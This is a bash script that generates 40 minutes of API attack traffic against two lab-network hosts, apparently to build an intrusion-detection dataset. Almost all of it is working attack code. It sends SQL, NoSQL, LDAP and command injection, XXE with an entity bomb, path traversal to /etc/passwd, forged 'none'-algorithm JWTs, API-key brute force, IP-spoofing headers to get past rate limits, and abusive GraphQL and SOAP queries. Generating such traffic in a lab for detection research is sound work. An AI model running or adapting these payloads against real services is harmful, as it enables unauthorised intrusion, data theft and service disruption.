#!/usr/bin/env bash
export LC_NUMERIC=C

#
# apiattacks_vm3_pure_api.sh – Pure API Attacks Traffic Generator
# Usage: sudo ./apiattacks_vm3_pure_api.sh
#
# Duration: 2400 s (40.0 min)
# Specific API attacks only, no benign traffic or other attack types
#

### 1) Root check
if (( EUID != 0 )); then
  echo "Run with sudo for full network access" >&2
  exit 1
fi

### 2) Minimal dependencies (no external dictionaries)
missing=()
for cmd in curl python3 openssl; do
  command -v "$cmd" &>/dev/null || missing+=($cmd)
done
(( ${#missing[@]} )) && {
  echo "Missing: ${missing[*]}. Install with:"  
  echo "  sudo apt update && sudo apt install -y curl python3 openssl"
  exit 1
}

### 3) Configuration for pure API attacks
duration=2400
end_time=$(( SECONDS + duration ))
targets=(192.168.56.101 192.168.56.102)

# Specific API endpoints (not generic web)
api_endpoints=(
  api/v1/users api/v2/users api/users
  api/v1/auth api/v2/auth api/auth api/login api/register
  api/v1/posts api/v2/posts api/posts api/articles
  api/v1/admin api/v2/admin api/admin api/dashboard
  api/v1/files api/v2/files api/upload api/download
  api/v1/search api/v2/search api/query
  api/v1/payments api/v2/payments api/transactions
  api/v1/reports api/v2/reports api/analytics
  api/v1/settings api/v2/settings api/config
  api/v1/notifications api/v2/notifications api/alerts
)

# Typical API tool User-Agents (not browsers)
api_user_agents=(
  "curl/7.68.0" "curl/8.0.1" "curl/7.81.0" "curl/7.74.0"
  "python-requests/2.25.1" "python-requests/2.28.2" "python-requests/2.31.0"
  "HTTPie/2.4.0" "HTTPie/3.2.1" "HTTPie/3.0.2"
  "Postman/8.12.5" "Postman/9.15.2" "Postman/10.8.4"
  "Insomnia/2022.6.0" "Insomnia/2023.1.0"
  "axios/0.27.2" "axios/1.3.4" "axios/1.4.0"
  "node-fetch/3.2.4" "fetch/1.0.0"
  "RestSharp/108.0.1" "OkHttp/4.9.3"
)

# Internal wordlist for fuzzing (no external files)
internal_wordlist=(
  admin administrator root user guest test demo
  login logout auth authenticate authorization token
  password passwd pwd secret key api_key session
  config configuration settings preferences options
  upload download file files document documents
  search find query filter sort order limit offset
  create read update delete insert select drop alter
  users accounts profiles customers clients members
  posts articles blogs news comments reviews ratings
  products items catalog inventory stock orders
  payments transactions billing invoices receipts
  reports analytics metrics statistics logs audit
  notifications alerts messages emails sms push
  backup restore export import sync migrate deploy
  debug trace error exception fault failure timeout
)

iface=$(ip route|awk '/^default/ {print $5;exit}')
echo "=== VM3: Pure API Attacks (${duration}s) from $iface ==="

### 4) Specific API attack functions

# Generates SQL injection payloads specific to APIs
gen_sql_injection(){
  local payloads=(
    "1' OR '1'='1"
    "1; DROP TABLE users; --"
    "' UNION SELECT * FROM information_schema.tables --"
    "1' AND (SELECT COUNT(*) FROM users) > 0 --"
    "admin'--"
    "' OR 1=1 LIMIT 1 --"
    "1' ORDER BY 1000 --"
    "'; WAITFOR DELAY '00:00:05' --"
    "1' AND SLEEP(5) --"
    "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
  )
  echo "${payloads[RANDOM % ${#payloads[@]}]}"
}

# Generates specific NoSQL payloads
gen_nosql_injection(){
  local payloads=(
    '{"$ne": ""}'
    '{"$gt": ""}'
    '{"$regex": ".*"}'
    '{"$where": "this.username == this.password"}'
    '{"$or": [{"username": "admin"}, {"username": "root"}]}'
    '{"username": {"$ne": null}, "password": {"$ne": null}}'
    '{"$expr": {"$eq": ["$username", "$password"]}}'
  )
  echo "${payloads[RANDOM % ${#payloads[@]}]}"
}

# Generates JSON with specific API injections
gen_api_json(){
  local attack_type=$((RANDOM % 12))
  local base_data=$(openssl rand -hex 8)
  
  case $attack_type in
    0) # SQL Injection
      local sql_payload=$(gen_sql_injection)
      echo "{\"id\":\"$sql_payload\",\"data\":\"$base_data\"}"
      ;;
    1) # NoSQL Injection  
      local nosql_payload=$(gen_nosql_injection)
      echo "{\"username\":$nosql_payload,\"password\":$nosql_payload}"
      ;;
    2) # XSS in API
      echo "{\"comment\":\"<script>alert('api-xss')</script>\",\"data\":\"$base_data\"}"
      ;;
    3) # Path Traversal
      echo "{\"file\":\"../../../etc/passwd\",\"action\":\"read\",\"token\":\"$base_data\"}"
      ;;
    4) # Command Injection
      echo "{\"cmd\":\"ls -la; cat /etc/passwd\",\"execute\":true,\"session\":\"$base_data\"}"
      ;;
    5) # XXE
      echo "{\"xml\":\"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>\"}"
      ;;
    6) # LDAP Injection
      echo "{\"filter\":\"*)(uid=*))(|(uid=*\",\"base\":\"$base_data\"}"
      ;;
    7) # Mass Assignment
      echo "{\"username\":\"test\",\"role\":\"admin\",\"isAdmin\":true,\"permissions\":[\"all\"],\"token\":\"$base_data\"}"
      ;;
    8) # JWT Manipulation
      echo "{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.\",\"data\":\"$base_data\"}"
      ;;
    9) # API Rate Limit Bypass
      echo "{\"requests\":1000,\"bypass\":true,\"api_key\":\"$base_data\"}"
      ;;
    10) # Deserialization
      echo "{\"serialized\":\"O:8:\\\"stdClass\\\":1:{s:4:\\\"exec\\\";s:10:\\\"/bin/bash\\\";}\",\"data\":\"$base_data\"}"
      ;;
    *) # Parameter Pollution
      echo "{\"id\":1,\"id\":2,\"user\":\"admin\",\"user\":\"guest\",\"action\":\"delete\",\"token\":\"$base_data\"}"
      ;;
  esac
}

# Specific REST API attacks
rest_api_attacks(){
  local tgt=$1 port=$2 count=$3
  local ua=${api_user_agents[RANDOM % ${#api_user_agents[@]}]}
  
  for ((i=1; i<=count; i++)); do
    local ep=${api_endpoints[RANDOM % ${#api_endpoints[@]}]}
    local attack_method=$((RANDOM % 6))
    
    case $attack_method in
      0) # SQL Injection via GET
        local sql_payload=$(gen_sql_injection)
        timeout 3 curl -s -A "$ua" \
          -H "Accept: application/json" \
          -H "X-API-Key: $(openssl rand -hex 16)" \
          "http://$tgt:$port/$ep?id=$sql_payload&filter=$sql_payload" >/dev/null 2>&1 &
        ;;
      1) # JSON Injection via POST
        local json_payload=$(gen_api_json)
        timeout 3 curl -s -A "$ua" \
          -H "Content-Type: application/json" \
          -H "X-API-Key: $(openssl rand -hex 16)" \
          --data "$json_payload" "http://$tgt:$port/$ep" >/dev/null 2>&1 &
        ;;
      2) # Authentication Bypass
        local bypass_payload='{"username":"admin","password":"password","bypass":true}'
        timeout 3 curl -s -A "$ua" \
          -H "Content-Type: application/json" \
          -H "Authorization: Bearer invalid_token" \
          --data "$bypass_payload" "http://$tgt:$port/$ep" >/dev/null 2>&1 &
        ;;
      3) # Parameter Pollution
        timeout 3 curl -s -A "$ua" \
          -H "Accept: application/json" \
          "http://$tgt:$port/$ep?id=1&id=2&user=admin&user=guest&action=delete&action=create" >/dev/null 2>&1 &
        ;;
      4) # HTTP Method Override
        local json_payload=$(gen_api_json)
        timeout 3 curl -s -X POST -A "$ua" \
          -H "Content-Type: application/json" \
          -H "X-HTTP-Method-Override: DELETE" \
          --data "$json_payload" "http://$tgt:$port/$ep" >/dev/null 2>&1 &
        ;;
      5) # API Versioning Attack
        local version=$((1 + RANDOM % 5))
        local json_payload=$(gen_api_json)
        timeout 3 curl -s -A "$ua" \
          -H "Content-Type: application/json" \
          -H "API-Version: v$version" \
          --data "$json_payload" "http://$tgt:$port/api/v$version/admin" >/dev/null 2>&1 &
        ;;
    esac
  done
}

# GraphQL specific attacks
graphql_api_attacks(){
  local tgt=$1 port=$2
  local ua=${api_user_agents[RANDOM % ${#api_user_agents[@]}]}
  
  local queries=(
    '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
    '{"query":"{ user(id: \"1 OR 1=1\") { id name email password } }"}'
    '{"query":"mutation { deleteUser(id: \"1; DROP TABLE users; --\") { success } }"}'
    '{"query":"{ users(first: 1000000) { id name email } }"}'
    '{"query":"{ user(id: \"admin\") { ...deepNesting } } fragment deepNesting on User { posts { comments { replies { author { posts { comments { replies { id } } } } } } } }"}'
    '{"query":"query IntrospectionQuery { __schema { queryType { name fields { name } } mutationType { name fields { name } } } }"}'
  )
  
  for query in "${queries[@]}"; do
    timeout 3 curl -s -A "$ua" \
      -H "Content-Type: application/json" \
      -H "X-GraphQL-Token: $(openssl rand -hex 16)" \
      --data "$query" "http://$tgt:$port/graphql" >/dev/null 2>&1 &
  done
}

# SOAP API specific attacks
soap_api_attacks(){
  local tgt=$1 port=$2
  local ua=${api_user_agents[RANDOM % ${#api_user_agents[@]}]}
  
  for action in "GetUser" "UpdateUser" "DeleteUser" "AuthenticateUser"; do
    local soap_file=$(mktemp)
    cat > "$soap_file" <<EOF
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY bomb "lol1lol1lol1lol1lol1lol1lol1lol1lol1lol1">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <auth>$(openssl rand -hex 16)</auth>
  </soap:Header>
  <soap:Body>
    <${action}Request>
      <userId>1' OR '1'='1</userId>
      <sessionId>&xxe;</sessionId>
      <data>&bomb;</data>
      <sqlPayload>'; DROP TABLE users; --</sqlPayload>
    </${action}Request>
  </soap:Body>
</soap:Envelope>
EOF
    timeout 3 curl -s -A "$ua" \
      -H "Content-Type: text/xml" \
      -H "SOAPAction: $action" \
      -H "X-API-Key: $(openssl rand -hex 16)" \
      --data @"$soap_file" "http://$tgt:$port/soap" >/dev/null 2>&1 &
    rm -f "$soap_file"
  done
}

# API Fuzzing without external dictionaries
api_fuzzing(){
  local tgt=$1 port=$2
  local base_ep=${api_endpoints[RANDOM % ${#api_endpoints[@]}]}
  
  # Fuzzing with internal wordlist
  for word in "${internal_wordlist[@]}"; do
    timeout 2 curl -s -A "${api_user_agents[RANDOM % ${#api_user_agents[@]}]}" \
      -H "Accept: application/json" \
      -H "X-API-Key: $(openssl rand -hex 8)" \
      "http://$tgt:$port/$base_ep/$word" >/dev/null 2>&1 &
    
    # Concurrency control
    if (( $(jobs -r 2>/dev/null | wc -l) > 20 )); then
      sleep 0.1
    fi
  done
}

# Specific API Authentication attacks
api_auth_attacks(){
  local tgt=$1 port=$2
  local ua=${api_user_agents[RANDOM % ${#api_user_agents[@]}]}
  
  # API Keys brute force
  local fake_keys=()
  for i in {1..10}; do
    fake_keys+=("$(openssl rand -hex 16)")
    fake_keys+=("admin_$(openssl rand -hex 8)")
    fake_keys+=("api_$(openssl rand -hex 12)")
  done
  
  for key in "${fake_keys[@]}"; do
    local json_payload='{"action":"admin_access","resource":"users"}'
    timeout 2 curl -s -A "$ua" \
      -H "Content-Type: application/json" \
      -H "X-API-Key: $key" \
      --data "$json_payload" "http://$tgt:$port/api/admin" >/dev/null 2>&1 &
  done
  
  # JWT Attacks
  local jwt_payloads=(
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.invalid"
    "Bearer null"
    "Bearer undefined"
  )
  
  for jwt in "${jwt_payloads[@]}"; do
    timeout 2 curl -s -A "$ua" \
      -H "Authorization: $jwt" \
      -H "Accept: application/json" \
      "http://$tgt:$port/api/auth/verify" >/dev/null 2>&1 &
  done
}

# Check endpoint availability
check_endpoint(){
  local tgt=$1 port=$2
  timeout 1 bash -c "echo >/dev/tcp/$tgt/$port" 2>/dev/null
}

### 5) Main Loop - API Attacks Only
attack_cycle=0
while (( SECONDS < end_time )); do
  api_attack_type=$((RANDOM%8))  # 8 types of API attacks
  tgt=${targets[RANDOM % ${#targets[@]}]}
  ts=$(date +%T)
  attack_cycle=$((attack_cycle + 1))
  
  printf '[%s] Cycle#%d API-ATTACK#%d -> %s\n' "$ts" "$attack_cycle" "$api_attack_type" "$tgt"

  case $api_attack_type in
    0)  # Massive REST API Attacks
      if check_endpoint "$tgt" 3000; then
        rest_api_attacks "$tgt" 3000 $((20+RANDOM%30))
      fi
      ;;

    1)  # GraphQL API Attacks
      if check_endpoint "$tgt" 4000; then
        graphql_api_attacks "$tgt" 4000
      fi
      ;;

    2)  # SOAP API Attacks  
      if check_endpoint "$tgt" 5000; then
        soap_api_attacks "$tgt" 5000
      fi
      ;;

    3)  # API Authentication Attacks
      if check_endpoint "$tgt" 3000; then
        api_auth_attacks "$tgt" 3000
      fi
      ;;

    4)  # API Fuzzing (no external dictionaries)
      if check_endpoint "$tgt" 3000; then
        api_fuzzing "$tgt" 3000
      fi
      ;;

    5)  # API Rate Limit Bypass
      if check_endpoint "$tgt" 3000; then
        ep=${api_endpoints[RANDOM % ${#api_endpoints[@]}]}
        for i in {1..50}; do
          timeout 2 curl -s -A "${api_user_agents[RANDOM % ${#api_user_agents[@]}]}" \
            -H "X-Forwarded-For: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" \
            -H "X-Real-IP: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" \
            -H "X-Originating-IP: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" \
            "http://$tgt:3000/$ep?burst=$i" >/dev/null 2>&1 &
        done
      fi
      ;;

    6)  # API Business Logic Attacks
      if check_endpoint "$tgt" 3000; then
        logic_payloads=(
          '{"amount":-1000,"transfer":true}'
          '{"quantity":999999999,"discount":100}'
          '{"price":0.01,"premium_feature":true}'
          '{"user_id":0,"admin_override":true}'
        )
        for payload in "${logic_payloads[@]}"; do
          ep=${api_endpoints[RANDOM % ${#api_endpoints[@]}]}
          timeout 3 curl -s -A "${api_user_agents[RANDOM % ${#api_user_agents[@]}]}" \
            -H "Content-Type: application/json" \
            --data "$payload" "http://$tgt:3000/$ep" >/dev/null 2>&1 &
        done
      fi
      ;;

    7)  # Multi-API Combined Attack
      # REST + GraphQL + SOAP simultaneous
      if check_endpoint "$tgt" 3000; then
        rest_api_attacks "$tgt" 3000 10 &
      fi
      if check_endpoint "$tgt" 4000; then
        graphql_api_attacks "$tgt" 4000 &
      fi
      if check_endpoint "$tgt" 5000; then
        soap_api_attacks "$tgt" 5000 &
      fi
      ;;
  esac

  # Optimized concurrency control
  current_jobs=$(jobs -r 2>/dev/null | wc -l)
  if (( current_jobs > 100 )); then
    while (( $(jobs -r 2>/dev/null | wc -l) > 50 )); do 
      sleep 0.1
    done
  fi

  # Minimal pause to maximize API attacks
  sleep $(awk 'BEGIN{srand(); printf "%.2f", 0.03+rand()*0.12}')
done

# Final cleanup
echo "Finishing API attacks and cleaning processes..."
jobs -r 2>/dev/null | while IFS= read -r job; do
  kill %1 2>/dev/null || true
done 2>/dev/null
wait 2>/dev/null

echo "=== Pure API Attacks finished ==="
echo "API attack cycles completed: $attack_cycle"
